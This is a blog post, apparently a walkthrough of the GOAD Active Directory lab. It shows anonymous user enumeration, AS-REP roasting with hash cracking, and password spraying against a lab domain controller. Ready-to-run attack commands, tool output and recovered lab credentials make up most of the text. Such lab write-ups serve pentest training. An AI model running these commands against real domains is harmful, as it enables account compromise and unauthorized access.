---
layout: post
title:  "GOAD - part 2 - find users"
category : AD
tags :  AD, Lab, cme, enum4linux
---

## Enumerate DC's anonymous

### With CME

```bash
cme smb 192.168.56.11 --users
```

![cme_users_anonym](/assets/blog/GOAD/cme_users_anonym.png)

- We get some users with the description and get a first password as samwell.tarly got his password set up in description.

we could also retreive the password policy before trying bruteforce
![cme_pass_pol](/assets/blog/GOAD/cme_pass_pol.png)

- The password policy show us if we fail 5 time in 5 minutes we lock the accounts for 5minutes.

### With enum4linux

- We can confirm the anonymous listing on the NORTH DC also with Enum4linux :

```bash
enum4linux 192.168.56.11
```

- We get the user list like cme

![enum4linux_users](/assets/blog/GOAD/enum4linux_user.png)

- We also get the password policy like cme

![enum4linux_passpol](/assets/blog/GOAD/enum4linux_passpol.png)

- enum4linux also get the full domain user list by enumerating members of domain group

![enum4linux_group_membership](/assets/blog/GOAD/enum4linux_group_membership.png)


### With rpc call

- The anonymous listing is done with Remote Procedure Call on winterfell (192.168.56.11), so we could also do this with rpcclient directly.

```bash
rpcclient -U "NORTH\\" 192.168.56.11 -N
```

```
rpcclient $> enumdomusers
user:[Guest] rid:[0x1f5]
user:[arya.stark] rid:[0x456]
user:[sansa.stark] rid:[0x45a]
user:[brandon.stark] rid:[0x45b]
user:[rickon.stark] rid:[0x45c]
user:[hodor] rid:[0x45d]
user:[jon.snow] rid:[0x45e]
user:[samwell.tarly] rid:[0x45f]
user:[jeor.mormont] rid:[0x460]
user:[sql_svc] rid:[0x461]

rpcclient $> enumdomgroups
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[DnsUpdateProxy] rid:[0x44f]
group:[Stark] rid:[0x452]
group:[Night Watch] rid:[0x453]
group:[Mormont] rid:[0x454]
```

- Get all domain users:

```bash
net rpc group members 'Domain Users' -W 'NORTH' -I '192.168.56.11' -U '%'
```

```
NORTH\Administrator
NORTH\vagrant
NORTH\krbtgt
NORTH\SEVENKINGDOMS$
NORTH\arya.stark
NORTH\eddard.stark
NORTH\catelyn.stark
NORTH\robb.stark
NORTH\sansa.stark
NORTH\brandon.stark
NORTH\rickon.stark
NORTH\hodor
NORTH\jon.snow
NORTH\samwell.tarly
NORTH\jeor.mormont
NORTH\sql_svc
```

## ASREP - roasting

- We create a users.txt file with all the user name previously found:

```
sql_svc
jeor.mormont
samwell.tarly
jon.snow
hodor
rickon.stark
brandon.stark
sansa.stark
robb.stark
catelyn.stark
eddard.stark
arya.stark
krbtgt
vagrant
Guest
Administrator
```

- We now could try asreproasting on all the users with impacket:

```bash
GetNPUsers.py north.sevenkingdoms.local/ -no-pass -usersfile users.txt
```

```
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
[-] User sql_svc doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jeor.mormont doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User samwell.tarly doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jon.snow doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User hodor doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User rickon.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:5b71bebe8d2955599a76ccf4a4fec284$c4c31f24c834e7d292283d30a8fe53bc7535cbd09ce607a9c6e83f8a581aab2c55a78c49b4187fb729e47e041e90bc97a893b4cc175114471a3d0463b2f47ac07ca2968a6ebf9b12d84e008fe8a9abe7eb2be9ae16c6096740df6467d856ab7f47a56eea06d6fcf68593b0158dfa670e429aebe291492432f9b66198e880fd77cf70bf23c408b055bccc7660a972bdb959115a9550942bbc9debcd847ff88cffecf70cfa0fd8cb5e9935b0933d59eebd0b53d9ccfafd45a8bfc93709c4c61e73ce526fb1e95199b74649929e0e518436b2eee3ac940cace92183774c72dcc9216cec86c374a4b11deade517e04c5b4e34459c43b80d955f5040c256dd53dd69f5f5373fbbf6c
[-] User sansa.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User robb.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User catelyn.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User eddard.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User arya.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User vagrant doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
```

- We get a ticket for brandon.stark and we will try to break it as the user don't require kerberos preauthentication

```bash
hashcat -m 18200 asrephash /usr/share/wordlists/rockyou.txt
```

```
...
Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 2 secs

$krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:5b71bebe8d2955599a76ccf4a4fec284$c4c31f24c834e7d292283d30a8fe53bc7535cbd09ce607a9c6e83f8a581aab2c55a78c49b4187fb729e47e041e90bc97a893b4cc175114471a3d0463b2f47ac07ca2968a6ebf9b12d84e008fe8a9abe7eb2be9ae16c6096740df6467d856ab7f47a56eea06d6fcf68593b0158dfa670e429aebe291492432f9b66198e880fd77cf70bf23c408b055bccc7660a972bdb959115a9550942bbc9debcd847ff88cffecf70cfa0fd8cb5e9935b0933d59eebd0b53d9ccfafd45a8bfc93709c4c61e73ce526fb1e95199b74649929e0e518436b2eee3ac940cace92183774c72dcc9216cec86c374a4b11deade517e04c5b4e34459c43b80d955f5040c256dd53dd69f5f5373fbbf6c:iseedeadpeople

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOC...fbbf6c
Time.Started.....: Mon Jul  4 09:56:16 2022, (0 secs)
Time.Estimated...: Mon Jul  4 09:56:16 2022, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   393.2 kH/s (5.44ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 57344/14344385 (0.40%)
Rejected.........: 0/57344 (0.00%)
Restore.Point....: 49152/14344385 (0.34%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: truckin -> YELLOW1
Hardware.Mon.#1..: Temp: 78c Util: 80%
```

- We found the user password "iseedeadpeople"

- We now got two couple of credentials :
    - samwell.tarly:Heartsbane
    - brandon.stark:iseedeadpeople

## Password Spray

- We could try the classic user=password test 

```bash
cme smb 192.168.56.11 -u users.txt -p users.txt --no-bruteforce
```

![spray_user_eq_pass.png](/assets/blog/GOAD/spray_user_eq_pass.png)

- We also could use sprayhound (https://github.com/Hackndo/sprayhound)

```bash
sprayhound -U users.txt -d north.sevenkingdoms.local -dc 192.168.56.11 --lower
```

![spray_hound_novalid_user.png](/assets/blog/GOAD/spray_hound_novalid_user.png)

- We could try sprayhound with a valid user to avoid locking account (option -t to set the number of try left)

```bash
sprayhound -U users.txt -d north.sevenkingdoms.local -dc 192.168.56.11 -lu hodor -lp hodor --lower -t 2
```

- See the status of bruteforce

```bash
cme smb -u samwell.tarly -p Heartsbane -d north.sevenkingdoms.local 192.168.56.11 --users
```

![cme_users_badpassword_count.png](/assets/blog/GOAD/cme_users_badpassword_count.png)

- We now got three couple of credentials :
    - samwell.tarly:Heartsbane (user description)
    - brandon.stark:iseedeadpeople (asreproasting)
    - hodor:hodor (password spray)